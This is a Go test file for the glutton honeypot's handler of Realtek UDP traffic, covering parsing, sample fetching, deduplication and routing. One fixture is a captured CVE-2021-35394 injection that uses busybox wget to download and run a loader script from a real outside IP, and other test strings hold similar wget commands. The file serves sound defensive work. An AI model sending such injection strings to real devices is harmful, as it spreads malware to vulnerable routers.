package udp

import (
	"context"
	"errors"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/spf13/viper"
	"github.com/stretchr/testify/require"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/helpers"
)

// Captured datagram (Ochi event dd956ba6-16d5-44f8-becf-760ad929f3df,
// udp/9034 from 84.33.103.153): CVE-2021-35394 injection fetching a loader.
var realtekRead1 = []byte("orf;cd /tmp;rm wget.sh;/bin/busybox wget http://202.110.70.60:800/wget.sh;sh wget.sh realtek; #")

func realtekAddrs() (*net.UDPAddr, *net.UDPAddr) {
	return &net.UDPAddr{IP: net.ParseIP("84.33.103.153"), Port: 40637},
		&net.UDPAddr{IP: net.ParseIP("198.51.100.1"), Port: 9034}
}

// withRealtekFetch swaps the fetcher and dedupe state, sets
// realtek.fetch_samples, and returns the URLs fetched.
func withRealtekFetch(t *testing.T, enabled bool, fetch func(string) (string, error)) *[]string {
	t.Helper()
	prevFetch, prevCache, prevNow := realtekFetch, realtekFetched, realtekNow
	prevFlag := viper.Get("realtek.fetch_samples")
	var mu sync.Mutex
	fetched := []string{}
	realtekFetch = func(u string) (string, error) {
		mu.Lock()
		fetched = append(fetched, u)
		mu.Unlock()
		return fetch(u)
	}
	realtekFetched = &realtekFetchCache{m: map[string]realtekFetchEntry{}}
	now := time.Date(2026, 11, 8, 10, 42, 39, 0, time.UTC)
	realtekNow = func() time.Time { return now }
	viper.Set("realtek.fetch_samples", enabled)
	t.Cleanup(func() {
		realtekFetch, realtekFetched, realtekNow = prevFetch, prevCache, prevNow
		viper.Set("realtek.fetch_samples", prevFlag)
	})
	return &fetched
}

func sendRealtek(t *testing.T, h *recordingHoneypot, data []byte) []parsedRealtek {
	t.Helper()
	src, dst := realtekAddrs()
	n := len(h.produced)
	require.NoError(t, HandleRealtek(context.Background(), src, dst, data, connection.Metadata{}, testLogger{}, h))
	require.Len(t, h.produced, n+1)
	require.Equal(t, "realtek", h.produced[n].handler)
	require.Equal(t, connection.EndHandlerClose, h.produced[n].endReason)
	return h.produced[n].decoded.([]parsedRealtek)
}

func TestHandleRealtekCaptured(t *testing.T) {
	fetched := withRealtekFetch(t, false, func(string) (string, error) { return "", errors.New("unexpected fetch") })
	h := &recordingHoneypot{}

	events := sendRealtek(t, h, realtekRead1)
	require.Equal(t, realtekRead1, h.produced[0].payload)
	require.Empty(t, h.replies)
	require.Empty(t, *fetched, "fetch_samples is off")
	require.Equal(t, []parsedRealtek{{
		Direction:   "read",
		Command:     "orf",
		Shell:       "cd /tmp;rm wget.sh;/bin/busybox wget http://202.110.70.60:800/wget.sh;sh wget.sh realtek",
		Path:        "http://202.110.70.60:800/wget.sh",
		URLs:        []string{"http://202.110.70.60:800/wget.sh"},
		PayloadHash: "aa48eb26e6eb1d6fd576e86cb50d5eebefed0623b6c3d17beba05ba3d4b05fbe",
		Payload:     realtekRead1,
	}}, events)
}

func TestHandleRealtekFetchesSamples(t *testing.T) {
	fetched := withRealtekFetch(t, true, func(u string) (string, error) { return "hash-of-" + u, nil })
	h := &recordingHoneypot{}

	events := sendRealtek(t, h, realtekRead1)
	url := "http://202.110.70.60:800/wget.sh"
	require.Equal(t, []string{url}, *fetched)
	require.Equal(t, map[string]string{url: "hash-of-" + url}, events[0].SampleHashes)

	// A repeat within the TTL reuses the hash without downloading again.
	events = sendRealtek(t, h, realtekRead1)
	require.Equal(t, []string{url}, *fetched)
	require.Equal(t, map[string]string{url: "hash-of-" + url}, events[0].SampleHashes)
}

func TestHandleRealtekFetchLimits(t *testing.T) {
	fetched := withRealtekFetch(t, true, func(u string) (string, error) {
		if strings.HasSuffix(u, "/fail") {
			return "", errors.New("404")
		}
		return "h", nil
	})
	h := &recordingHoneypot{}

	// Only http(s) is fetched, at most maxRealtekFetches per datagram; a
	// failed fetch is not retried within the TTL.
	data := []byte("orf;tftp tftp://a.test/t;wget http://a.test/fail;wget http://a.test/1;wget http://a.test/2")
	events := sendRealtek(t, h, data)
	require.Equal(t, []string{"http://a.test/fail", "http://a.test/1"}, *fetched)
	require.Equal(t, map[string]string{"http://a.test/1": "h"}, events[0].SampleHashes)

	events = sendRealtek(t, h, data)
	require.Equal(t, []string{"http://a.test/fail", "http://a.test/1", "http://a.test/2"}, *fetched)
	require.Equal(t, map[string]string{"http://a.test/1": "h", "http://a.test/2": "h"}, events[0].SampleHashes)
}

func TestHandleRealtekSkipsFetchWhenSlotsFull(t *testing.T) {
	fetched := withRealtekFetch(t, true, func(string) (string, error) { return "h", nil })
	for i := 0; i < cap(helpers.SampleFetchSlots); i++ {
		helpers.SampleFetchSlots <- struct{}{}
	}
	t.Cleanup(func() {
		for i := 0; i < cap(helpers.SampleFetchSlots); i++ {
			<-helpers.SampleFetchSlots
		}
	})
	h := &recordingHoneypot{}

	events := sendRealtek(t, h, realtekRead1)
	require.Empty(t, *fetched)
	require.Nil(t, events[0].SampleHashes)
	// The skipped URL is not marked as fetched.
	fetch, _ := realtekFetched.claim("http://202.110.70.60:800/wget.sh", realtekNow())
	require.True(t, fetch)
}

func TestHandleRealtekNonOrf(t *testing.T) {
	withRealtekFetch(t, true, func(string) (string, error) { return "", errors.New("unexpected fetch") })
	h := &recordingHoneypot{}

	data := []byte("\x00\x01hello")
	events := sendRealtek(t, h, data)
	require.Equal(t, []parsedRealtek{{
		Direction:   "read",
		PayloadHash: helpers.SHA256Hex(data),
		Payload:     data,
	}}, events)
}

func TestHandleRealtekTruncated(t *testing.T) {
	withRealtekFetch(t, false, nil)
	h := &recordingHoneypot{}

	data := append([]byte("orf;echo "), []byte(strings.Repeat("A", 2000))...)
	events := sendRealtek(t, h, data)
	require.True(t, events[0].Truncated)
	require.Len(t, events[0].Payload, maxRealtekPayload)
	require.Equal(t, "orf", events[0].Command)
}

func TestHandleUDPRoutesRealtek(t *testing.T) {
	withRealtekFetch(t, false, nil)
	h := &recordingHoneypot{}
	src, _ := realtekAddrs()
	dst := &net.UDPAddr{IP: net.ParseIP("198.51.100.1"), Port: 52869}

	require.NoError(t, HandleUDP(context.Background(), src, dst, realtekRead1, connection.Metadata{}, testLogger{}, h))
	require.Len(t, h.produced, 1)
	require.Equal(t, "realtek", h.produced[0].handler)

	require.NoError(t, HandleUDP(context.Background(), src, dst, []byte("orfeus"), connection.Metadata{}, testLogger{}, h))
	require.Len(t, h.produced, 2)
	require.Equal(t, "udp", h.produced[1].handler)
}
